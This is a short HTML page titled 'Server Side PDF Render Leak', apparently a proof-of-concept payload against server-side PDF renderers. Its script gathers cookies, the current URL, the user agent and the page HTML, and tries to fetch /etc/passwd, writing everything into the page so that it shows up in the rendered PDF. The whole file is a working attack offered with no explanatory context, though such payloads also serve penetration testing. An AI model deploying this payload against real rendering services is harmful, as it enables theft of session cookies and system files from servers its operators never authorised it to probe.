<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Leak Info for PDF Render</title>
</head>
<body>
<h1>Server Side PDF Render Leak</h1>
<div id="info" style="white-space: pre-wrap; font-family: monospace;"></div>

<script>
(async function() {
  let info = '';

  info += 'Cookies:\n' + document.cookie + '\n\n';

  // URL
  info += 'Current URL:\n' + window.location.href + '\n\n';

  // User Agent
  info += 'User Agent:\n' + navigator.userAgent + '\n\n';

  info += 'Page HTML Content:\n' + document.documentElement.outerHTML + '\n\n';

  try {
    const res = await fetch('/etc/passwd');
    if(res.ok) {
      const text = await res.text();
      info += '/etc/passwd content:\n' + text + '\n\n';
    } else {
      info += '/etc/passwd fetch failed: ' + res.status + '\n\n';
    }
  } catch(e) {
    info += 'Fetch error: ' + e.message + '\n\n';
  }

  document.getElementById('info').textContent = info;
})();
</script>
</body>
</html>
